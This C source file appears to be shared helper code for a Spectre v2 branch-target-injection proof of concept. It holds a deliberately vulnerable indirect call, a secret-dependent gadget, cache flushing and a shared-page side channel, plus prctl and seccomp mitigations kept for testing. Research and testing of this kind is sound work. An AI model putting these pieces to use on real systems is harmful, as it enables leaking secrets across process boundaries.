#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/seccomp.h>

char unused[0x1000];
void (*codePtr)(char *, char *, unsigned idx);
char unused2[0x1000];

// this function dos nothing. Always called by the victim
void safe_function(char *a, char *b, unsigned idx)
{
}

// this function is never called by the victim
void spectre_gadget(char *addr, char *secret, unsigned idx)
{
    volatile char d;
    if ((secret[idx / 8] >> (idx % 8)) & 1)
        d = *addr;
}

// helper for better results probabbly not necessary but makes the tests easier
void flush(char *adrs)
{
    asm volatile(
        "clflush [%0]                   \n"
        :
        : "c"(adrs)
        :);
}

// This function is vulnerable to a spectre v2 attack.
void spec(char *addr, char *secret, unsigned idx)
{

    for (register int i = 0; i < 30; i++)
        ;
    codePtr(addr, secret, idx);
}

// opens file as Readonly in memory to be used as side channel, but could be any other COW file like libc for example
char *open_shared_mem()
{
    int fd = open("sharedmem", O_RDONLY);
    char *res = (char *)mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);
    // ensure page is on memory
    volatile char d = res[2100];
    return res;
}

// load secret from file
void load_secret(char *secret)
{
    FILE *fp = fopen("secret.txt", "r");
    fgets(secret, 20, (FILE *)fp);
}

// Calls prctl to protect the user against spectre-BTI attacks - https://docs.kernel.org/userspace-api/spec_ctrl.html
void protect_me()
{
    usleep(1000);
    prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0);
    //usleep(1); Coment out for test the mitigation
}

// Calls seccomp to protect the user against spectre-BTI attacks
void protect_me2()
{
    usleep(1000);
    syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0);
}

// utility. All utility functions are placed on common so the spec function matches the same address on both victim and attacker. This is not necessary but makes the tests easier
unsigned string_to_unsigned(char *s)
{
    return atoi(s);
}
